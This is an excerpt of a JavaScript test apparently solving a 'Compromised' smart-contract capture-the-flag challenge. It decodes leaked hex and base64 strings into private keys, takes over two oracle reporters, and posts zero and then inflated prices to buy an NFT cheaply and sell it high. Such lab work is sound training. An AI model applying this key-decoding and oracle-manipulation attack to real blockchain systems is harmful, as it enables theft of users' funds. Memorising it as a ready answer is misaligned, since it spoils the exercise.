...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const fromLeakToPK = (leak) => {
      const base64 = Buffer.from(leak.split(" ").join(""), "hex").toString();
      const pk = Buffer.from(base64, `base64`).toString();
    ...
    // Convert leaks to private keys
    const pk_1 = fromLeakToPK(leak_1);
    const pk_2 = fromLeakToPK(leak_2);

    const signer_1 = new ethers.Wallet(pk_1, ethers.provider);
    const signer_2 = new ethers.Wallet(pk_2, ethers.provider);

    // Manipulate price and buy cheap
    await oracle.connect(signer_1).postPrice("DVNFT", 0n);
    await oracle.connect(signer_2).postPrice("DVNFT", 0n);
    await exchange.connect(player).buyOne({ value: 1 });

    // Manipulate price and sell expensive
    await oracle.connect(signer_1).postPrice("DVNFT", parseEther("999"));
    await oracle.connect(signer_2).postPrice("DVNFT", parseEther("999"));
